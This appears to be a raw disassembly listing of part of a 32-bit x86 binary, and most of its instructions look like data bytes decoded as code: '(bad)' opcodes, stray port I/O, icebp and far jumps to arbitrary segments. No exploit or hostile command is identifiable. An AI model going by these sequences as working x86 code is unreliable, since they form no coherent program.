  424eed:	push   0xbc9d10f0
  424ef2:	popf   
  424ef3:	ins    DWORD PTR es:[edi],dx
  424ef4:	sbb    edx,eax
  424ef6:	sub    dh,cl
  424ef8:	cli    
  424ef9:	mov    bh,0x46
  424efb:	int3   
  424efc:	jecxz  0x424ea9
  424efe:	xchg   edx,eax
  424eff:	push   0xf2b7cc23
  424f04:	sbb    DWORD PTR [eax+0x6a],edi
  424f07:	gs repz push ds
  424f0a:	push   eax
  424f0b:	std    
  424f0c:	fs jno 0x424edf
  424f0f:	int3   
  424f10:	imul   ebp,DWORD PTR [esp+esi*4+0x4f],0xa70d2d0
  424f18:	mov    ebx,DWORD PTR [eax+ebx*2-0x5742af00]
  424f1f:	push   ds
  424f20:	ror    DWORD PTR [ecx-0x64],0x49
  424f24:	in     al,0x68
  424f26:	jge    0x424f39
  424f28:	ins    BYTE PTR es:[edi],dx
  424f29:	fild   WORD PTR [esi]
  424f2b:	or     DWORD PTR [edi],eax
  424f2d:	ja     0x424fac
  424f2f:	fild   WORD PTR [eax]
  424f31:	jno    0x424eb8
  424f33:	mov    ?,WORD PTR ds:0x37361842
  424f39:	add    BYTE PTR [edx-0x4cdb2cbd],bh
  424f3f:	data16 cmc 
  424f41:	adc    DWORD PTR [edx+eax*1-0x4681782c],esi
  424f48:	outs   dx,BYTE PTR ds:[esi]
  424f49:	cmp    ebx,DWORD PTR ds:0x3efa493f
  424f4f:	mov    bh,0x17
  424f51:	rcr    DWORD PTR [ebx-0x7ea4e690],cl
  424f57:	ins    BYTE PTR es:[edi],dx
  424f58:	out    dx,eax
  424f59:	mov    DWORD PTR [ebp-0x11b5a00e],ebp
  424f5f:	data16 cld 
  424f61:	out    dx,al
  424f62:	push   ebp
  424f63:	imul   edi,DWORD PTR [eax-0x56],0xffffff86
  424f67:	popf   
  424f68:	sbb    dh,0xaa
  424f6b:	xchg   BYTE PTR [eax-0x4a],dh
  424f6e:	mov    dh,0xd4
  424f70:	js     0x424f74
  424f72:	dec    ebp
  424f73:	mov    edx,0xd097a19d
  424f78:	inc    ecx
  424f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f7a:	dec    esp
  424f7b:	popa   
  424f7c:	inc    ebp
  424f7d:	scas   eax,DWORD PTR es:[edi]
  424f7e:	sbb    al,0xd7
  424f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f81:	int3   
  424f82:	rol    DWORD PTR [eax+0x19e50e75],0x27
  424f89:	and    dh,BYTE PTR [edx]
  424f8b:	mov    ecx,DWORD PTR ds:0x27ef22
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	lods   al,BYTE PTR ds:[esi]
  425001:	fist   DWORD PTR [esi-0x19]
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	push   ax
  42500e:	push   esp
  42500f:	pusha  
  425010:	or     eax,DWORD PTR [eax+edx*8-0x37b730bb]
  425017:	mov    ebx,DWORD PTR [edi+ecx*1+0x59]
  42501b:	xchg   esi,ebp
  42501d:	mov    ch,0xc6
  42501f:	cld    
  425020:	mov    ds:0x38d75f24,al
  425025:	xor    ebp,DWORD PTR [eax+edx*4-0x16481c4]
  42502c:	rcr    BYTE PTR [edi+0x7c],cl
  42502f:	mov    esp,0x7a078575
  425034:	retf   0x8023
  425037:	xchg   esi,eax
  425038:	mov    edi,0xffba78d9
  42503d:	adc    edi,DWORD PTR [ebp+0xc]
  425040:	mov    dh,0x2d
  425042:	stos   BYTE PTR es:[edi],al
  425043:	test   eax,0x66c0167e
  425048:	shl    DWORD PTR [esi-0x46],0x94
  42504c:	stc    
  42504d:	test   DWORD PTR [esi],esi
  42504f:	das    
  425050:	or     DWORD PTR [ebx],edx
  425052:	repz xor DWORD PTR [ebx-0x6f],0xdddf054a
  42505a:	dec    DWORD PTR [eax-0x5b]
  42505d:	pop    edx
  42505e:	xor    BYTE PTR [esi-0x3ff0e562],0x54
  425065:	push   ebp
  425066:	sar    ebp,cl
  425068:	pop    edi
  425069:	pushf  
  42506a:	or     BYTE PTR [esi-0x46],dl
  42506d:	ss xchg esi,eax
  42506f:	inc    esp
  425070:	sar    dh,1
  425072:	cli    
  425073:	fwait
  425074:	adc    BYTE PTR [esi+0x3f],bl
  425077:	jle    0x425005
  425079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42507a:	xor    al,0x61
  42507c:	js     0x42506b
  42507e:	xchg   ebx,eax
  42507f:	mov    ebx,0xb47f8b45
  425084:	mov    cl,0x34
  425086:	ds sti 
  425088:	mov    al,ds:0x7e67ebff
  42508d:	std    
  42508e:	neg    DWORD PTR [ebx-0x5331801d]
  425094:	cs cdq 
  425096:	les    ebp,FWORD PTR [ebx+0x49e8f1cd]
  42509c:	(bad)  
  42509d:	sub    ecx,DWORD PTR [edi+0x68]
  4250a0:	frstor [ebx]
  4250a2:	adc    eax,0x38b1b503
  4250a7:	(bad)  
  4250a8:	and    DWORD PTR [edx+ebx*1],ebx
  4250ab:	test   DWORD PTR ds:0xec1f2edf,esp
  4250b1:	or     ah,BYTE PTR [edi+esi*2]
  4250b4:	dec    ecx
  4250b5:	inc    ebx
  4250b6:	jmp    0x42512b
  4250b8:	xor    eax,0x645c3a59
  4250bd:	int3   
  4250be:	xor    BYTE PTR [ecx+0x45],cl
  4250c1:	push   cs
  4250c2:	adc    BYTE PTR [eax+0x5f],dh
  4250c5:	popa   
  4250c6:	jns    0x425111
  4250c8:	fist   WORD PTR [ecx+0x251b2b34]
  4250ce:	sbb    ecx,DWORD PTR [eax]
  4250d0:	adc    eax,0x8fd89433
  4250d5:	das    
  4250d6:	inc    ebp
  4250d7:	xchg   edx,eax
  4250d8:	jae    0x425098
  4250da:	dec    eax
  4250db:	and    edi,ebp
  4250dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250de:	mov    DWORD PTR gs:[ebp+0x38],ecx
  4250e2:	lods   eax,DWORD PTR ds:[esi]
  4250e3:	mov    al,BYTE PTR [eax+0x2748e4e6]
  4250e9:	jge    0x4250a8
  4250eb:	in     eax,dx
  4250ec:	dec    edx
  4250ed:	shl    BYTE PTR [edi-0x1e8c9e92],cl
  4250f3:	inc    edi
  4250f4:	xchg   esp,eax
  4250f5:	or     eax,0x492c9960
  4250fa:	add    BYTE PTR [edi],ch
  4250fc:	stos   DWORD PTR es:[edi],eax
  4250fd:	push   eax
  4250fe:	aas    
  4250ff:	or     ebp,DWORD PTR [eax]
  425101:	fistp  QWORD PTR [ebx]
  425103:	cmp    al,0xc2
  425105:	mov    al,ds:0xc6f4334d
  42510a:	cld    
  42510b:	jno    0x4250b6
  42510d:	xor    ch,BYTE PTR [esi]
  42510f:	ret    0x0
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x3789:0xdc592e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [eax+ebx*2-0x6a],bh
  42518f:	call   0x5ca4f84a
  425194:	iret   
  425195:	sbb    al,BYTE PTR [ebp+0x61262073]
  42519b:	adc    bp,si
  42519e:	add    bh,BYTE PTR [ebx-0x57ea355d]
  4251a4:	enter  0xc45d,0xd2
  4251a8:	(bad)  
  4251a9:	loopne 0x425190
  4251ab:	adc    ecx,edx
  4251ad:	ins    DWORD PTR es:[edi],dx
  4251ae:	leave  
  4251af:	and    eax,0x2da2972b
  4251b4:	pushf  
  4251b5:	pop    ebx
  4251b6:	fs and dh,0xce
  4251ba:	mov    ds:0xf0e3d674,al
  4251bf:	repnz pop edx
  4251c1:	sti    
  4251c2:	rcl    DWORD PTR [edi-0x4128f593],0x2a
  4251c9:	mov    cl,0x8d
  4251cb:	xor    ch,ah
  4251cd:	mov    ecx,0xbf03ee1f
  4251d2:	mov    ebp,0xec8676fd
  4251d7:	jo     0x4251ba
  4251d9:	mov    DWORD PTR [ebx*4-0x3bcead9e],ecx
  4251e0:	xchg   BYTE PTR [edx+0x3],cl
  4251e3:	in     al,dx
  4251e4:	push   ebp
  4251e5:	fistp  QWORD PTR [edx+0x5d63901]
  4251eb:	arpl   si,di
  4251ed:	retf   
  4251ee:	mov    ch,0xf8
  4251f0:	(bad)  
  4251f1:	mov    bl,0x24
  4251f3:	sbb    eax,0x8303fe61
  4251f8:	adc    DWORD PTR [edx+ecx*1+0x14],edi
  4251fc:	pop    esp
  4251fd:	fdivrp st(0),st
  4251ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425200:	adc    BYTE PTR [eax+0xc64a2e4],0x11
  425207:	bound  esp,QWORD PTR [ebp+0x759dc139]
  42520d:	rcl    bl,cl
  42520f:	push   es
  425210:	xor    al,0x41
  425212:	or     ebp,DWORD PTR [edx]
  425214:	test   eax,0x250f4ca5
  425219:	mov    edi,DWORD PTR ds:0xfed9e06f
  42521f:	out    0x58,al
  425221:	or     al,0xa
  425223:	dec    eax
  425224:	add    eax,0x6ea2f0d6
  425229:	mov    al,ds:0xa8003f13
  42522e:	and    eax,0xe1e3e193
  425233:	aad    0xf8
  425235:	xchg   edi,eax
  425236:	push   edi
  425237:	mov    bl,0xce
  425239:	mov    edi,0xff1843e9
  42523e:	mov    ecx,0x8399559d
  425243:	out    0x7f,eax
  425245:	push   0x35
  425247:	addr16 leave 
  425249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42524a:	adc    ebx,DWORD PTR [edx]
  42524c:	hlt    
  42524d:	cmp    DWORD PTR [ebx+0x72],esi
  425250:	rol    BYTE PTR [ecx-0x62],1
  425253:	inc    esi
  425254:	fistp  QWORD PTR [ebx-0x3eca4ec5]
  42525a:	lea    eax,[esi-0x7b]
  42525d:	div    DWORD PTR ds:0x4fa22c07
  425263:	sbb    eax,0x6e407525
  425268:	push   ds
  425269:	mov    ch,0x99
  42526b:	jns    0x425226
  42526d:	jbe    0x4252b3
  42526f:	mov    dl,0x33
  425271:	fldcw  WORD PTR [esi+edx*2+0x2e]
  425275:	loopne 0x42525a
  425277:	mov    al,BYTE PTR [ebx]
  425279:	ror    DWORD PTR [ecx-0x2b],cl
  42527c:	andnps xmm1,XMMWORD PTR [ecx-0x3b]
  425280:	jge    0x42522b
  425282:	clc    
  425283:	cmp    DWORD PTR [ecx-0x4234f24e],edx
  425289:	or     cl,BYTE PTR [ebp+0x7d]
  42528c:	cmp    BYTE PTR [ebx-0x7d],bh
  42528f:	out    dx,eax
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	stos   DWORD PTR es:[edi],eax
  425301:	cdq    
  425302:	xor    dh,BYTE PTR [esp+edi*4]
  425305:	mov    WORD PTR [ecx],es
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	jns    0x425329
  42530e:	(bad)  
  42530f:	xchg   edx,eax
  425310:	jmp    eax
  425312:	out    dx,al
  425313:	retf   0x655f
  425316:	popf   
  425317:	sub    DWORD PTR [esi-0x2e60a569],ecx
  42531d:	call   0xed3b:0xb85d3794
  425324:	xor    DWORD PTR [edx+ebx*8-0x76],edx
  425328:	xor    DWORD PTR [ebp+0x7f],esp
  42532b:	mov    ds:0x9b2bdd7a,al
  425330:	lock jmp 0xe5a834ba
  425336:	fadd   st,st(5)
  425338:	or     ecx,DWORD PTR [esi]
  42533a:	mov    ds:0x7321a28d,eax
  42533f:	xchg   BYTE PTR [eax-0x3d],bh
  425342:	mov    DWORD PTR [edi],edx
  425344:	or     bl,BYTE PTR [esi]
  425346:	add    DWORD PTR [ebp+0x28],edx
  425349:	cmp    eax,0xdf710019
  42534e:	mov    ecx,0xc3744592
  425353:	push   ecx
  425354:	push   esi
  425355:	lahf   
  425356:	pop    ecx
  425357:	adc    DWORD PTR [eax+0x44b540c4],ebp
  42535d:	sbb    eax,0x2256296d
  425362:	clc    
  425363:	dec    ebx
  425364:	pop    ecx
  425365:	ss and al,0x5
  425368:	test   DWORD PTR [ebp-0x7b],0x4072e6c4
  42536f:	popf   
  425370:	leave  
  425371:	mov    ?,WORD PTR [esi+0xb169a9d]
  425377:	dec    ecx
  425378:	in     eax,0x2
  42537a:	lods   al,BYTE PTR ds:[esi]
  42537b:	sbb    ebx,DWORD PTR [esi]
  42537d:	xor    dh,BYTE PTR [ebx+ebx*1+0x14]
  425381:	retf   0x2f77
  425384:	dec    esp
  425385:	adc    DWORD PTR [esi-0x5b782d35],esp
  42538b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42538c:	mov    bh,0x15
  42538e:	ror    BYTE PTR [ebp-0x37],1
  425391:	fwait
  425392:	out    dx,eax
  425393:	sar    BYTE PTR [ebx+ebp*1-0x4309f6d7],1
  42539a:	or     eax,0xb270b09e
  42539f:	xchg   cl,ah
  4253a1:	inc    eax
  4253a2:	pop    es
  4253a3:	xor    DWORD PTR [edi+eax*4+0x55],ebp
  4253a7:	fnstenv [edi+0xb]
  4253aa:	jmp    0x77ab:0xe1f3fc6b
  4253b1:	xchg   ecx,eax
  4253b2:	out    dx,al
  4253b3:	stos   BYTE PTR es:[edi],al
  4253b4:	adc    edx,DWORD PTR [esp+ecx*2+0x7c19dd81]
  4253bb:	mov    esp,0x32d40833
  4253c0:	ret    
  4253c1:	mov    dh,0x86
  4253c3:	lods   al,BYTE PTR ds:[esi]
  4253c4:	rol    BYTE PTR [ebx],cl
  4253c6:	jbe    0x425405
  4253c8:	dec    esi
  4253c9:	sub    ebx,ebp
  4253cb:	push   DWORD PTR [esp+ebp*1+0x5d6f83d8]
  4253d2:	addr16 jne 0x42535c
  4253d5:	mov    al,ds:0x559848dd
  4253da:	and    eax,0xc2267c52
  4253df:	popa   
  4253e0:	shl    DWORD PTR [edx+0x5a],1
  4253e3:	add    dl,BYTE PTR [edx]
  4253e5:	in     al,0x5e
  4253e7:	into   
  4253e8:	add    edx,DWORD PTR [esi+0x11]
  4253eb:	add    BYTE PTR [esi+0x4e],dl
  4253ee:	mov    ds:0x432f8cbe,al
  4253f3:	cli    
  4253f4:	xor    BYTE PTR [edi+0x6d534a25],dl
  4253fa:	stc    
  4253fb:	mov    dh,bh
  4253fd:	sbb    BYTE PTR [edi-0x27ccbee9],ch
  425403:	pop    edx
  425404:	sub    ch,BYTE PTR [ecx-0x6ccf7e1f]
  42540a:	mov    esi,0xda5c484a
  42540f:	push   es
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esi,ebp
  425481:	call   0x1:0x8dc0d7ca
  425488:	add    al,0x1
  42548a:	add    BYTE PTR [eax],al
  42548c:	mov    al,0x8d
  42548e:	lods   eax,DWORD PTR ds:[esi]
  42548f:	je     0x4254f6
  425491:	fcomp  QWORD PTR [ecx+0x3c]
  425494:	mov    esp,0xb0d65c8
  425499:	inc    eax
  42549a:	addr16 or eax,0xa33e8973
  4254a0:	mov    ecx,0xddb4c5c
  4254a5:	mov    bh,BYTE PTR [esi-0x43d88a90]
  4254ab:	cli    
  4254ac:	pop    ss
  4254ad:	daa    
  4254ae:	mov    ds:0xd92be10c,eax
  4254b3:	ins    DWORD PTR es:[edi],dx
  4254b4:	in     eax,0xcf
  4254b6:	fs jb  0x4254d6
  4254b9:	ret    
  4254ba:	in     al,0x79
  4254bc:	dec    edi
  4254bd:	fnstcw WORD PTR [edx-0x25]
  4254c0:	(bad)  
  4254c1:	scas   eax,DWORD PTR es:[edi]
  4254c2:	push   esp
  4254c3:	fisttp QWORD PTR [esi+edi*8+0x62e3a9ff]
  4254ca:	call   0x6f97:0x8208baaf
  4254d1:	jmp    0x7b9d:0x8e7bf497
  4254d8:	loop   0x42551f
  4254da:	scas   al,BYTE PTR es:[edi]
  4254db:	cld    
  4254dc:	jmp    0xf405a749
  4254e1:	cdq    
  4254e2:	and    bh,ch
  4254e4:	popf   
  4254e5:	test   DWORD PTR [esi-0x214736e2],0x7f5c16b5
  4254ef:	xchg   DWORD PTR [ecx],esi
  4254f1:	arpl   WORD PTR [ecx-0x47b72ace],cx
  4254f7:	cld    
  4254f8:	pop    ebx
  4254f9:	sbb    DWORD PTR [ecx],esi
  4254fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254fc:	or     BYTE PTR [eax],0xb9
  4254ff:	test   esi,ebx
  425501:	fwait
  425502:	enter  0xaf06,0x35
  425506:	cs scas eax,DWORD PTR es:[edi]
  425508:	bound  edi,QWORD PTR [ebp+eiz*4-0x1d565126]
  42550f:	adc    cl,dl
  425511:	dec    esp
  425512:	mov    edx,0xb28dda06
  425517:	adc    al,0x3
  425519:	je     0x4254b8
  42551b:	push   edx
  42551c:	inc    edx
  42551d:	adc    eax,0x141345df
  425522:	repz rcr BYTE PTR [edi-0x26dcfb00],cl
  425529:	rol    BYTE PTR [ebx-0x62],cl
  42552c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42552d:	cmp    eax,DWORD PTR [ecx-0x5b]
  425530:	sbb    eax,0x8170f996
  425535:	scas   eax,DWORD PTR es:[edi]
  425536:	add    eax,0xc87b6b44
  42553b:	lods   eax,DWORD PTR ds:[esi]
  42553c:	mov    ecx,0x63a31c91
  425541:	into   
  425542:	xchg   esi,eax
  425543:	icebp  
  425544:	leave  
  425545:	xor    esp,DWORD PTR [ebx+0x59]
  425548:	dec    ebp
  425549:	int3   
  42554a:	and    esp,ebx
  42554c:	imul   DWORD PTR [ebp-0x45b80629]
  425552:	jno    0x425567
  425554:	(bad)  
  425555:	dec    DWORD PTR [edi]
  425557:	xchg   ebp,eax
  425558:	les    ebp,FWORD PTR [eax]
  42555a:	leave  
  42555b:	fmul   QWORD PTR ds:0x5be5c525
  425561:	mov    al,0xd5
  425563:	or     BYTE PTR [esi+0x32],dh
  425566:	dec    esp
  425567:	cs push ebx
  425569:	jg     0x4255d2
  42556b:	jns    0x425577
  42556d:	sbb    eax,0xbd9abc24
  425572:	sar    ch,cl
  425574:	push   esp
  425575:	sub    BYTE PTR [ecx-0x2d964889],0xe5
  42557c:	adc    BYTE PTR [ebx-0x38],dl
  42557f:	enter  0xbe4c,0xf9
  425583:	call   0x46c4:0x9760dc06
  42558a:	pop    ecx
  42558b:	and    bl,ch
  42558d:	sub    dl,BYTE PTR [esi]
  42558f:	lock add BYTE PTR [eax],al
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xc573f13a
  425602:	cli    
  425603:	jmp    0x104:0x18ec4
  42560a:	add    BYTE PTR [eax],al
  42560c:	xchg   esp,eax
  42560d:	pop    eax
  42560e:	adc    al,0x5d
  425610:	aad    0x7a
  425612:	fucompp 
  425614:	nop
  425615:	sub    cl,BYTE PTR [edx]
  425617:	leave  
  425618:	push   esi
  425619:	or     BYTE PTR [eax],bh
  42561b:	addr16 addr16 repz int3 
  42561f:	or     cl,BYTE PTR [esi]
  425621:	call   0x5b1f0553
  425626:	or     edi,edi
  425628:	mov    BYTE PTR [ecx],dl
  42562a:	push   cs
  42562b:	enter  0xdd65,0x5
  42562f:	call   0xfce5748e
  425634:	fcom   DWORD PTR [eax-0x1e]
  425637:	mov    eax,ds:0x16f809c
  42563c:	fisubr DWORD PTR [ecx-0x64bb4ae8]
  425642:	adc    al,BYTE PTR [ecx+eax*4]
  425645:	call   0x5e7a43b9
  42564a:	push   ebx
  42564b:	sbb    DWORD PTR [edx+edi*8-0x3],esp
  42564f:	or     eax,0x76f70c45
  425654:	in     eax,dx
  425655:	mov    cl,0x83
  425657:	repnz rcr BYTE PTR [ebx+ebx*4],cl
  42565b:	shr    BYTE PTR [ebp+0x44e65552],cl
  425661:	ins    BYTE PTR es:[edi],dx
  425662:	push   edx
  425663:	add    al,BYTE PTR [eax-0x3e]
  425666:	(bad)  
  425667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425668:	lods   al,BYTE PTR ds:[esi]
  425669:	mov    ebp,0xe377d9c0
  42566e:	mov    ah,0xbb
  425670:	shr    ecx,1
  425672:	xchg   ch,ch
  425674:	pop    ebp
  425675:	popf   
  425676:	adc    dl,BYTE PTR [edx]
  425678:	pop    ds
  425679:	int    0xed
  42567b:	nop
  42567c:	add    eax,0x53c15022
  425681:	popa   
  425682:	lahf   
  425683:	inc    edi
  425684:	fadd   st,st(0)
  425686:	loope  0x42568f
  425688:	pop    edx
  425689:	push   edi
  42568a:	int    0x1e
  42568c:	popa   
  42568d:	fist   WORD PTR [edx+0x64]
  425690:	adc    bh,BYTE PTR ds:0xe7f1b0f7
  425696:	fcmovnu st,st(6)
  425698:	or     DWORD PTR [eax],ebp
  42569a:	dec    eax
  42569b:	mov    bh,0x21
  42569d:	or     DWORD PTR [ebx],ebx
  42569f:	mov    WORD PTR [ebx-0x19],?
  4256a2:	push   edx
  4256a3:	lea    edi,[edx]
  4256a5:	icebp  
  4256a6:	sbb    ch,0xa1
  4256a9:	in     al,dx
  4256aa:	inc    edx
  4256ab:	pop    ebx
  4256ac:	stos   DWORD PTR es:[edi],eax
  4256ad:	cmc    
  4256ae:	fwait
  4256af:	aad    0x61
  4256b1:	mov    edi,0x310ff0c4
  4256b6:	fwait
  4256b7:	icebp  
  4256b8:	adc    DWORD PTR [edi+0x12d9cde8],esp
  4256be:	mov    edi,0x75a69c89
  4256c3:	and    dl,bl
  4256c5:	test   al,0x71
  4256c7:	imul   edi,DWORD PTR [ecx-0x58ef595e],0xffffff9e
  4256ce:	nop
  4256cf:	or     edi,DWORD PTR [ecx+ebx*4-0x67b23cb0]
  4256d6:	pop    ss
  4256d7:	jns    0x4256e4
  4256d9:	mov    WORD PTR [eax-0x51],es
  4256dc:	inc    edi
  4256dd:	and    ch,ch
  4256df:	cmp    eax,0x84b486b4
  4256e4:	fbstp  TBYTE PTR [eax]
  4256e6:	test   al,0xbf
  4256e8:	sub    edx,ecx
  4256ea:	cli    
  4256eb:	or     edi,DWORD PTR [edi]
  4256ed:	in     al,dx
  4256ee:	adc    eax,0xdecee0ae
  4256f3:	fadd   QWORD PTR [esi-0x10558439]
  4256f9:	fucomp st(2)
  4256fb:	pusha  
  4256fc:	scas   eax,DWORD PTR es:[edi]
  4256fd:	rcl    BYTE PTR [ecx],0x2e
  425700:	pop    ds
  425701:	pop    ds
  425702:	and    al,0xe
  425704:	dec    esp
  425705:	test   eax,0x51a18a90
  42570a:	je     0x425777
  42570c:	adc    DWORD PTR [edi-0x58],eax
  42570f:	stos   BYTE PTR es:[edi],al
	...
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xc3dffa74
  425783:	jg     0x42574d
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	test   eax,0x69fa81bf
  425791:	push   eax
  425792:	push   ss
  425793:	in     eax,dx
  425794:	cli    
  425795:	adc    BYTE PTR [edx-0x33],dl
  425798:	retf   
  425799:	mov    edx,0x3a63372e
  42579e:	repnz mov dl,BYTE PTR [esi]
  4257a1:	in     al,dx
  4257a2:	xchg   ebx,eax
  4257a3:	test   eax,0xa1662e6
  4257a8:	cmp    al,0xd
  4257aa:	adc    bh,BYTE PTR [ebp+0x942cc0e]
  4257b0:	inc    eax
  4257b1:	push   eax
  4257b2:	loopne 0x425769
  4257b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257b5:	cs dec edi
  4257b7:	fwait
  4257b8:	mov    ecx,0x8c08f21c
  4257bd:	fist   WORD PTR [ecx+0x78]
  4257c0:	and    al,0xd
  4257c2:	out    0xbb,al
  4257c4:	push   edx
  4257c5:	inc    eax
  4257c6:	outs   dx,BYTE PTR ds:[esi]
  4257c7:	outs   dx,DWORD PTR ds:[esi]
  4257c8:	loop   0x4257df
  4257ca:	sti    
  4257cb:	and    BYTE PTR [ecx-0x2c1ae087],bl
  4257d1:	dec    edi
  4257d2:	inc    ebx
  4257d3:	aas    
  4257d4:	sub    esp,DWORD PTR [edi-0x6ce04233]
  4257da:	mov    ds:0x4d86f8cd,eax
  4257df:	icebp  
  4257e0:	xlat   BYTE PTR ds:[ebx]
  4257e1:	je     0x4257fe
  4257e3:	mov    ds:0xe1d7f588,al
  4257e8:	or     eax,0x8d83cf08
  4257ed:	nop
  4257ee:	xor    BYTE PTR [eax+esi*1-0x1],ch
  4257f2:	jl     0x425793
  4257f4:	test   al,0x23
  4257f6:	cmp    ebx,edi
  4257f8:	mov    ecx,0xd50b47be
  4257fd:	shl    DWORD PTR [ecx+0x26b4d72a],0xba
  425804:	or     esi,ebp
  425806:	sub    BYTE PTR [esi+0x52d8d7a8],bl
  42580c:	pop    edi
  42580d:	sub    DWORD PTR [esi+0x3d],eax
  425810:	mov    al,ds:0xad85c909
  425815:	push   ds
  425816:	inc    edi
  425817:	imul   esi,DWORD PTR [edx+0x13684fc5],0x52
  42581e:	repnz frstor ds:0xddf45cc1
  425825:	cmp    eax,0xa6b56cb7
  42582a:	mov    esp,0x9e2a04a5
  42582f:	add    al,0x65
  425831:	dec    ebx
  425832:	jmp    0x1a247e97
  425837:	cmp    eax,0xd1b055ef
  42583c:	push   0x5de385dd
  425841:	and    eax,0x50d061b3
  425846:	mov    BYTE PTR [ecx-0x17056f],cl
  42584c:	push   esi
  42584d:	sub    ebx,DWORD PTR [ebx+0x57]
  425850:	xchg   ah,bh
  425852:	aas    
  425853:	(bad)  
  425854:	or     eax,0xd2308859
  425859:	out    0x7e,al
  42585b:	xor    BYTE PTR [edi],cl
  42585d:	pop    edx
  42585e:	mov    ah,0x5e
  425860:	dec    ecx
  425861:	mov    ebx,0x1327184f
  425866:	pop    edi
  425867:	test   ebx,edx
  425869:	les    esp,FWORD PTR [ebx-0x80]
  42586c:	mov    dh,0x29
  42586e:	mov    al,0xa6
  425870:	test   eax,ebp
  425872:	push   ecx
  425873:	dec    eax
  425874:	enter  0xca7f,0x68
  425878:	cld    
  425879:	loop   0x425874
  42587b:	lods   eax,DWORD PTR ds:[esi]
  42587c:	repnz repnz inc ecx
  42587f:	fsubr  st(5),st
  425881:	dec    edi
  425882:	or     DWORD PTR [edi],0xa56db2f6
  425888:	inc    edx
  425889:	lods   eax,DWORD PTR ds:[esi]
  42588a:	lods   eax,DWORD PTR ds:[esi]
  42588b:	leave  
  42588c:	bound  ebp,QWORD PTR [ebx+0xf]
  42588f:	loop   0x425891
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	arpl   WORD PTR gs:[eax+0x7f],bp
  425904:	int3   
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	fmul   DWORD PTR [ecx]
  42590e:	shr    DWORD PTR [ebx],0xdc
  425911:	pop    esp
  425912:	out    0xe,eax
  425914:	push   ecx
  425915:	(bad)  
  425916:	mov    ebx,0xfa8b355d
  42591b:	inc    esp
  42591c:	aaa    
  42591d:	lods   al,BYTE PTR ds:[esi]
  42591e:	cdq    
  42591f:	cmp    ch,ah
  425921:	out    0xb4,eax
  425923:	mov    dl,0x29
  425925:	dec    edi
  425926:	sub    cl,BYTE PTR [edx]
  425928:	std    
  425929:	mov    edx,0x760d6fcb
  42592e:	cmp    BYTE PTR [edi],dh
  425930:	and    DWORD PTR [ecx],edi
  425932:	adc    BYTE PTR [esi+0x59],bl
  425935:	push   0x63604bb9
  42593a:	int3   
  42593b:	in     eax,dx
  42593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42593d:	nop
  42593e:	xor    ebx,ecx
  425940:	mov    bh,0x16
  425942:	xchg   ebp,eax
  425943:	lock jmp 0xa9851d25
  425949:	push   edx
  42594a:	pop    ds
  42594b:	push   ebx
  42594c:	dec    eax
  42594d:	mov    bl,0xce
  42594f:	pop    ebp
  425950:	jae    0x4259ba
  425952:	mov    dl,0x7e
  425954:	adc    ah,bh
  425956:	xlat   BYTE PTR ds:[ebx]
  425957:	jb     0x42599e
  425959:	push   0x68d10965
  42595e:	jno    0x425961
  425960:	pop    ss
  425961:	ficomp DWORD PTR [ebx]
  425963:	iret   
  425964:	jne    0x4259df
  425966:	in     al,dx
  425967:	add    DWORD PTR [esi+0x52a77c1a],ebp
  42596d:	xchg   ecx,eax
  42596e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42596f:	(bad)  
  425970:	ds inc ecx
  425972:	jbe    0x425955
  425974:	jmp    0x425907
  425976:	add    ecx,DWORD PTR [eax]
  425978:	dec    eax
  425979:	jnp    0x425940
  42597b:	mov    esp,0x4bca7d57
